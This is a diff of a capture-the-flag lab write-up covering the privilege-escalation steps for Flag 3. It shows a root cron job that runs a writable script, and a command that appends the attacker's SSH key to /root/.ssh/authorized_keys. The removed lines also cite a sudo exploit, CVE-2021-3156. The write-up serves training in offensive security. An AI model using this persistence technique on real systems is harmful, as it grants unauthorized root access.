@@ -158,37 +158,31 @@ head -n 2 /opt/brilliant_script.sh > /opt/brilliant_script.sh
 
 22. This fixes the accidental session closing and Gives us ⛳️ Flag 1
 
-## Switching to user ROOT
+## ⛳️ Flag 3: Privilege Escalation
 
-27. Check `sudo` version: `sudo --version`
+23. Checking **Cron Job** in malware, shows much more hidden points, The Job executes the script as **ROOT** user.
 
-28. It is vulnerable to with exploit: [CVE-2021-3156](https://github.com/Mhackiori/CVE-2021-3156)
+![cron job](images/20-cron-job.png)
 
-29. Moving Files to **$TARGET**
-
-30. Use `Makefile` script to build the files.
-
-
-## ⛳️ Reverse Engineering: Privilege Escalation and Flag 3
-
-1. CronJob Added in `liblogging.so` to exec: `/opt/brilliant_script.sh`
-
-2. It runs as `root` and we have access to it.
-
-3. Create ssh key
+24. We can use an old trick, Adding a SSH Public to server, and using it to login as **ROOT**. Let's create a ssh key
 ```sh
+# generating public/private keys
 ssh-keygen
-# generates public/private keys
-cat id_rsa.pub # you may choose another name for file!
+# you may choose another name for file!
+cat id_rsa.pub
 # ssh-rsa AAAA ... root@computer-name
 ```
 
-4. change `computer-name` in the end of ssh key to `recovery` and use `/opt/brilliant_script.sh` to add your ssh key to root:
+![ssh key](images/24-gen-ssh-key.png)
+
+25. change `computer-name` in the end of ssh key to `recovery` and use `/opt/brilliant_script.sh` to add your ssh key to root:
 ```ssh
 echo 'echo "ssh-rsa AAAA...U= root@recovery" > /root/.ssh/authorized_keys' >> /opt/brilliant_script.sh
 ```
 
-5. In code, SSH Key added for root, If you remove it, Flag 3 Appears in step above!
+![add sshkey](images/25-add-ssh-key.png)
+
+26. If you check the reverse engineered library, Malware adds a SSH Key to root same as what we did. What we did in step 25, removes SSH Key of malware and gives us the ⛳️ Flag 3.
 
 ## ⛳️ Reverse Engineering: Flag 4
 
